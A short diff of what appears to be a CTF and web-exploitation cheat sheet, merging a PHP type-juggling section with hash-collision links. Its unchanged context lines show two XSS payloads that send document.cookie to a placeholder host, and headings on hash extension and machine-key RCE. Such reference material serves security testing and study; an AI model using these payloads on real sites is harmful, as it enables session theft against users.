@@ -307,9 +307,9 @@ https://malwaredecoder.com/
 `<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`  
 
-## Type Juggling
-
-https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+## Type Juggling and Hash Collision
+https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
+https://github.com/JohnHammond/ctf-katana#php
 
 ### PHP - others tricks
 
@@ -658,10 +658,6 @@ https://github.com/iagox86/hash_extender
 
 2-  
 burp intruder -> payloads.out in file parameter.  
-
-## MD5 Collision and others
-
-https://github.com/JohnHammond/ctf-katana#php
 
 ## Insecure - Machine Key for RCE 
 
